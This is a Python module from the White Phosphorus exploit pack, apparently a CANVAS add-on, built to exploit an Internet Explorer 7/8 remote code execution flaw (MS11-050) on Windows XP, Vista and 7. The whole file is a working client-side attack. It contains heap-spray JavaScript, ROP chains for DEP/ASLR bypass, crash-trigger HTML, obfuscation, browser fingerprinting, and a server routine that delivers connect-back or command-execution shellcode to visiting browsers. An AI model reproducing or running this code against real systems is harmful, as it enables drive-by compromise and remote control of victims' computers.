
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

from pelib import PElib


######################################################################################
NAME = "IE layout-grid-char style Vulnerability"
DESCRIPTION = "IE layout-grid-char style Remote Code Execution Vulnerability"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2011-06-14"
DOCUMENTATION["References"] = """http://www.zerodayinitiative.com/advisories/ZDI-11-194/
http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html
http://www.microsoft.com/technet/security/Bulletin/MS11-050.mspx"""
DOCUMENTATION['CVE'] = "CVE-2011-1260'"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-1260'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["Repeatability"] = "Unlimited"   
DOCUMENTATION['VersionsAffected']='Windows XP/Vista/7, IE Versions 7/8'                           
DOCUMENTATION["Notes"] = """
This is a client-side exploit - USE THIS MODULE VIA HTTPSERVER

If you choose to host the exploit file on an independandant webserver you will need to host the relevant support files.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]
PROPERTY['MSADV'] = 'MS11-050'
PROPERTY['DELIVERY'] = 'HTTP'



NOTES="""
This is a client-side exploit - USE THIS MODULE VIA HTTPSERVER

If you choose to host the exploit file on an independandant webserver you will need to host the relevant support files.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> IE layout-grid-char style Vulnerability
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP Universal
1: Windows Vista IE7
2: Windows 7/Vista IE8

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms11_050_layout_grid/wp_ms11_050_layout_grid.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
OR
./exploits/httpserver/httpserver.py -O singleexploit:wp_ms11_050_layout_grid -l 10.1.1.1 -d 5555 -p 8080
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP Universal", (0x00000000), [WINALL]],
    1 : ["Windows Vista IE7", (0x00000000), [WINALL]],
    2 : ["Windows 7/Vista IE8", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]
    
    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name          = NAME
        self.targets       = targets
        self.version       = 0
        self.use_universal = True
        # We default these to false        
        self.HTTPMOSDEF    = False
        self.useSSLMOSDEF  = False
        self.isClientD     = False
                                
        self.badstring     = ''   # Shellcode is on heap or in dll
        
        #Ranomisze name for clientd
        self.filename      = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        
        # For IE7 .Net Shellcode
        self.vProtect = True
        self.pc       = 0x44444444;

    def is_vulnerable(self, info_dict):
        # Called from ClientD, if recon modules are enabled
        # returns a value used to rank the exploit within attacking modules
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] # it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
        
    def heapSpray(self,payload,heapspraycode):
        # This creates a heapspray of blocks that are 0x240000 (0x23f000 on Win7) in size  
        # almost gauruntees that our spray block sits at 0xxxxx1000 or other 100 byte boundary
        
        heapprefix = wp_randomstring(220)      # padding to 0x100 bytes
        
        script = """
memory = new Array();
var hs = unescape("HEAPSPRAYCODE");         

while(hs.length < 0x11F600) hs += hs; 
hs = hs.substring(0, 0x11F600-DATALENGTH); 

hs = unescape("PREFIX") + hs + unescape("PAYLOAD"); 

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= hs.substring(0,hs.length); 
}   
}
catch(err)
{}

"""
        script = script.replace('DATALENGTH',str( (0x100 + len(payload)) / 2 ))
        script = script.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        script = script.replace('PREFIX',wp_urluencode(heapprefix))
        script = script.replace('PAYLOAD',wp_urluencode(payload))      
        
        #Obfuscate the script code
        if self.isClientD:
            self.log("WP> Running jsObfuscator")
            return self.jsObfuscator.obfuscate(script)
        else:
            return script    
            
    def makeTriggerIE8(self):
        filedata="""                 
mem = new Array();
var ptr = unescape("%u1414%u1414");
 
while(ptr.length < #SIZE#) { ptr += ptr; }
ptr = ptr.slice(0, (#SIZE#)/2);

for(var i = 0; i < 0x3000; i++) { mem[i]= ptr.substring(0,ptr.length);}   
 
for(var xi = 0; xi < 5; xi++) {document.body.innerHTML += "<object align='right' hspace='1000' width='1000'>AAAAA</object>";}

for(var i = 0; i < 0x3000; i++) {mem[i+0x3000]= ptr.substring(0,ptr.length); }   
document.body.innerHTML += "<a id='AAAAA' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >AAAAA</a>";
document.body.innerHTML += "Please wait for the page to load.";
document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>111_AA</strong>";

</SCRIPT>
</body>
</html>        
"""
        filedata = filedata.replace("#SIZE#","0xDA")
        return filedata
    
    def makefileIE8_VistaWin7(self,stage):
        # Exploit for IE 8 Windows 7/Vista
        # This page loads java and uses sayonara
     
        if stage == 1:
            # Load Java
        
            filedata = """
<object alt="Verify JRE Applet 2" classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" width="1" height="1">
<param name="type" value="application/x-java-applet" />
<param name="codebase" value="/jsp_utils/" />
<param name="code" value="jreVerify.class" />
<param name="jumpto" value="/en/download/installed.jsp?" />
<param name="pause" value="5000" />	
</object>
<script>document.location="/PAGE2"</script>
"""
            filedata = filedata.replace('PAGE2', self.filename.replace('.html','.2.html'))
            return filedata
        elif stage == 2:
                    
            landingAddress = 0x14141414 
                    
            heapspraycode = pack('<L', 0x7C341AF9)          # RETN
            heapspraycode += pack('<L', 0x7C341AF9)*5       # RETN
            heapspraycode += pack('<L', 0x7C341AF9)         # RETN
            heapspraycode += pack('<L', 0x7C341A14)*26      # RETN 4
            heapspraycode += pack('<L', 0x7C34E7BA)         # Stack/Heap Flip
            while len(heapspraycode) < (0x100):             # Build out to 0x100 byte blocks
                heapspraycode += pack('<L', 0x7C341AF9)     # RETN
                            
            # depbypass using sayonara
            depbypass = self.wp_sayonaraASLRDEPBypass((len(self.shellcode)+104))
                    
            # Set the payload
            payload = depbypass + wp_randomnops(4) + self.shellcode + ("\x00" * 100)
            #pad the payload out to 0x100 bytes
            payload += wp_randomstring(256 - (len(payload)%256))
       
            filedata = """
<html>
<body>

<script language="JavaScript">
"""

            # script main heapspray code
            filedata += self.heapSpray(payload,heapspraycode)
    
            # Add the reset of the exploit trigger
            filedata += self.makeTriggerIE8()

            return filedata
            
            
    def makeTriggerIE7(self,amount="0x3000"):
        filedata="""                 
mem = new Array();
var ptr = unescape("%u1414%u1414");

while(ptr.length < #SIZE2#) { ptr += ptr; }
ptr2 = ptr.slice(0, (#SIZE2#/2));
ptr = ptr.slice(0, (#SIZE#/2));

for(var i = 0; i < #AMOUNT#; i++) {mem[i]= ptr.substring(0,ptr.length); }   

for(var xi = 0; xi < 5; xi++) {document.body.innerHTML += "<object align='right' hspace='1000' width='1000'>AAAAA</object>";}
for(var i = 0; i < 0x5000; i++) {mem[i+0x1000]= ptr2.substring(0,ptr2.length); }   
document.body.innerHTML += "<a id='AAAAA' style='bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px' >AAAAA</a>";
document.body.innerHTML += "Please wait for the page to load.";
document.body.innerHTML += "<strong style='font-size:1000pc;margin:auto -1000cm auto auto;' dir='ltr'>111_AA</strong>";

</SCRIPT>
</body>
</html>        
"""
        filedata = filedata.replace("#SIZE#","0xa8")
        filedata = filedata.replace("#SIZE2#","0x112")
        filedata = filedata.replace("#AMOUNT#",amount)
        return filedata            

    def makefileIE7(self,stage):
        # Exploit for Windows Vista IE 7
        # .Net DLL ASLR/DEP Bypass

        if stage == 1:
            filedata = """
<html>
<object classid="OURDLL#a.b" height="1" width="1"></object>   
<script>document.location="/PAGE2"</script>
</html>
"""
#"
            filedata = filedata.replace('OURDLL', self.filename.replace('.html','.dll'))
            filedata = filedata.replace('PAGE2', self.filename.replace('.html','.2.html'))
            
            return filedata        
        elif stage == 2:
            
            landingAddress = 0x14141414 
                    
            heapspraycode = pack('<L', landingAddress)  # ptr
            heapspraycode += pack('<L', landingAddress)  # ptr
            heapspraycode += pack('<L', self.pc)          # Return to .Net DLL code
            heapspraycode += pack('<L', self.pc)          # Return to .Net DLL code
            heapspraycode += pack('<L', self.pc)          # Return to .Net DLL code
            heapspraycode += pack('<L', self.pc)          # Return to .Net DLL code
            heapspraycode += pack('<L', self.pc)          # Return to .Net DLL code
            while len(heapspraycode) < (0x100):           # Build out to 0x100 byte blocks
                heapspraycode += pack('<L', self.pc)      # JUNK
                            
            # Set the payload, payload is inside the loaded dll file
            payload = ""
       
            filedata = """
<html>
<title>Loading</title>
<body>

<script language="JavaScript">
"""

            # script main heapspray code
            filedata += self.heapSpray(payload,heapspraycode)
    
            # Add the reset of the exploit trigger
            filedata+=self.makeTriggerIE7()

            return filedata
        
    def makefileWinXP(self,browser):
        # Exploit for Windows XP (DEP Bypass)
        landingAddress = 0x14141414
        if browser == "MSIE 8.0":
            heapspraycode = pack('<L', 0x77C21A57)          # RETN
            heapspraycode += pack('<L', 0x77C21A57)*5       # RETN
            heapspraycode += pack('<L', 0x77C21A57)         # RETN
            heapspraycode += pack('<L', 0x77C214DF)*26      # RETN 4 
            heapspraycode += pack('<L', 0x77C15ED5)         # Stack/Heap Flip (EAX->ESP)
            while len(heapspraycode) < (0x100):             # Build out to 0x100 byte blocks
                heapspraycode += pack('<L', 0x77C21A57)     # RETN
        else:
            heapspraycode = pack('<L', 0x77C214DF)         # RETN 4
            heapspraycode += pack('<L', 0x77C21A57)          # RETN
            heapspraycode += pack('<L', 0x77C15ED5)         # Stack/Heap Flip (EAX->ESP)
            while len(heapspraycode) < (0x100):             # Build out to 0x100 byte blocks
                heapspraycode += pack('<L', 0x77C21A57)     # RETN        
        
        # dep bypass
        depbypass = self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8) 
        
        # Set the payload
        payload = depbypass + wp_randomnops(4) + self.shellcode + ("\x00" * 100)
        
        #pad the payload out to 0x100 bytes
        payload += wp_randomstring(256 - (len(payload)%256))        

        filedata = """
<html>
<body>

<script language="JavaScript">
"""

        # script main heapspray code
        filedata += self.heapSpray(payload,heapspraycode)

        # Add the reset of the exploit trigger
        if browser == "MSIE 8.0":
            filedata += self.makeTriggerIE8()
        else:
            filedata += self.makeTriggerIE7("2500")
            
        return filedata        

    def makefile(self,browser,osversion):       

        if osversion == "Windows XP":
            self.log('WP> Serving Windows XP exploit')
            return self.makefileWinXP(browser)
        if browser == "MSIE 9.0":
            #self.log('WP> Serving MSIE 9.0 exploit')
            #return self.makefileIE8_VistaWin7(1)            
            return ""
            
        if browser == "MSIE 8.0":
            self.log('WP> Serving MSIE 8.0 exploit')
            return self.makefileIE8_VistaWin7(1)
        if browser == "MSIE 7.0":
            self.log('WP> Serving MSIE 7.0 exploit')
            return self.makefileIE7(1)   
                     
        # Default to a non ASLR version          
        self.log('WP> Serving Non ASLR Exploit')     
        return self.makefileWinXP(browser)

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        cookies = clientheader.getStrValue(['Cookie'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        
        
        #self.log('WP> User agent of connecting host: %s' % user_agent)        
        #self.log('WP> Cookies of connecting host: %s' % cookies)
                
        if clientheader.URL.count(self.filename):
            if cookies.count("SessionID"):
                self.log('WP> Exploit already sent to this client')
                self.log('WP> Returning blank page')
                data=""
            else:
                self.log('WP> Serving exploit html file')
                data=self.makefile(browser,osversion)
                                
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            
        elif (clientheader.URL.count('.dll')):
            p = PElib()        
            if browser == "MSIE 7.0":
                self.log('WP> Serving IE7 .Net DLL file')
                self.vProtect = True    # Needed for this type of payload
                data = p.createDotNETPEFileBuf(self.createShellcode(), self.pc)
                self.vProtect = False   # Reset this
            else:                        
                self.log('WP> Serving IE8 .Net DLL file')
                data = p.createDotNETPEFileBuf("", self.pc)

            b.setBody(data)
            h.addHeader('Content-Type','application/octet-stream')
            
        elif (clientheader.URL.count('.2.html')):
            if cookies.count("SessionID2"):
                self.log('WP> Exploit already sent to this client')
                self.log('WP> Returning blank page')
                data=""
            else:        
                self.log('WP> Serving exploit secondary file')
                if browser == "MSIE 7.0":
                    data=self.makefileIE7(2)
                else:
                    data=self.makefileIE8_VistaWin7(2)
                
            b.setBody(data)
            h.addHeader('Content-Type','text/html')    
            h.addHeader('Set-Cookie','SessionID2=%d' % self.jsObfuscator.getXORKey())     

        elif (clientheader.URL.count('iexplore.exe.config')):
            self.log('WP> Returning blank page')
            b.setBody("")
            h.addHeader('Content-Type','text/html')

        elif (clientheader.URL.count('jreVerify.class')):
            self.log('WP> Returning blank page')
            b.setBody("")
            h.addHeader('Content-Type','text/html')
        elif (clientheader.URL.count('favicon.ico')):
            self.log('WP> Returning blank page')
            b.setBody("")
            h.addHeader('Content-Type','text/html')            
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        self.log('WP> ****************************************')
        return h,b

    def run(self):

        if (self.version == 0):
            filedata=self.makefile('','Windows XP')
        elif (self.version ==1):
            filedata=self.makefile('MSIE 7','')
        elif (self.version ==2):
            filedata=self.makefile('MSIE 8','')
                    
        
        self.log("WP> Opening %s"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        
        self.log('WP> Wrote to %s'%(self.filename))
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
